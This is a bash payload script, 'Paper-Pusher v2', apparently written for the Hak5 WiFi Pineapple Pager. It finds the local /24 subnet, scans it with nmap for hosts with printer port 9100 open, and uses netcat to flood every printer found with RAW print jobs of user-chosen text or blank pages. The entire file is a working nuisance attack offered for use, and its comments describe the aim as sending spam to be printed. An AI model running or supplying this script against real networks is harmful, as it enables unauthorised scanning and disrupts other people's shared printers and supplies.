#!/bin/bash
# Paper-Pusher v2
# Hak5 WiFi Pineapple Pager port of the original "Paper-Pusher" (github.com/OSINTI4L/Paper-Pusher)
# PaperPusher Nmap scans the LAN subnet to find paper printers with port 9100 open and sends spam to be printed via RAW printing with Netcat. The script assumes that the subnet netmask is: 255.255.255.0.

# Ensure network connected:
LOG blue "Ensuring WiFi Pineapple Pager is network connected.."
sleep 1.5
NETCHK=$(ip -4 addr show dev wlan0cli scope global | grep -i inet)
if [ -n "$NETCHK" ]; then
    LOG green "WiFi Pineapple Pager is network connected!"
    sleep 1.5
else
    ALERT "WiFi Pineapple Pager is not network connected!"
    LOG red "Exiting."
    exit 0
fi

# Gather subnet:
LOG blue "Determining network subnet.."
sleep 1.5
SUBNET=$(ip r | grep -i wlan0cli | grep -i default | awk '{print $3}' | awk -F'.' '{print $1"."$2"."$3}')
if [ -n "$SUBNET" ]; then
    LOG green "Subnet: $SUBNET.0/24"
    sleep 1.5
else
    ALERT "Unable to determine subnet!"
    LOG red "Exiting."
    exit 0
fi

# Scan for printers with port 9100 exposed:
spinner1=$(START_SPINNER "Scanning for printers")
    ISPRINTER="false"
    for check in {1..10}; do
        PRNTR=($(nmap "$SUBNET".0/24 -p 9100 --open | grep -i "Nmap scan report" | awk '{print $NF}' | tr -d "()"))
        if [ -n "$PRNTR" ]; then
            ISPRINTER="true"
            break
        else
            sleep 3
        fi
    done
STOP_SPINNER "${spinner1}"

if [ "$ISPRINTER" != "true" ]; then
    ALERT "No printer(s) found with port 9100 exposed!"
    LOG red "Exiting."
    exit 0
fi

LOG green "Printer(s) found at: ${PRNTR[@]} with port 9100 exposed!"
sleep 1.5

# Text and number of pages to be printed:
PRNTTXT="$(TEXT_PICKER 'Enter text to be printed' 'Leave empty to spam paper')"
PRNTPGS="$(TEXT_PICKER 'Number of pages to print?' '')"
if [ -z "$PRNTPGS" ]; then
    ALERT "Number of pages to print cannot be empty!"
    LOG red "Exiting."
    exit 0
fi

# Send payload:
spinner2=$(START_SPINNER "Sending payload to printer")
for printers in "${PRNTR[@]}"; do
    for pages in $(seq "$PRNTPGS"); do
        echo -e "$PRNTTXT\n\f"
    done | nc -c -w 2 "$printers" 9100
done
STOP_SPINNER "${spinner2}"

sleep .5

LOG green "Payload sent!"
